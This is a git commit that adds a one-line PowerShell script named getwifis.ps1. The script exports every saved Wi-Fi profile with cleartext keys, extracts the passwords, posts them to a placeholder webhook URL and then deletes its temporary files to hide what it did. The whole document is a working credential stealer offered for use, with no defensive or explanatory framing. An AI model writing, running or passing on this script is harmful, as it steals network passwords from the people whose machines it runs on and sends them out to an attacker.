a5ce773006bd8c43965cf27a0b0b7b4f8b49d3a8
Andres Moreno <andres.moreno.98@hotmail.com>
2023-03-10 21:46:58 +0100

    Create getwifis.ps1

---
+++ getwifis.ps1
@@ -0,0 +1,1 @@
+$tmpath = $env:TEMP;$allpwds = "Wi-all";$hook = "WEBHOOK_URL_HERE";nEtSH.exe wlan export profile key=clear folder=$tmpath;Select-String -Path $tmpath\\Wi*.xml -Pattern 'KeyMaterial' > $tmpath\$allpwds;iwr -Uri $hook -Method POST -InFile $tmpath\$allpwds;rm -Force -Path $tmpath\Wi-*;exit
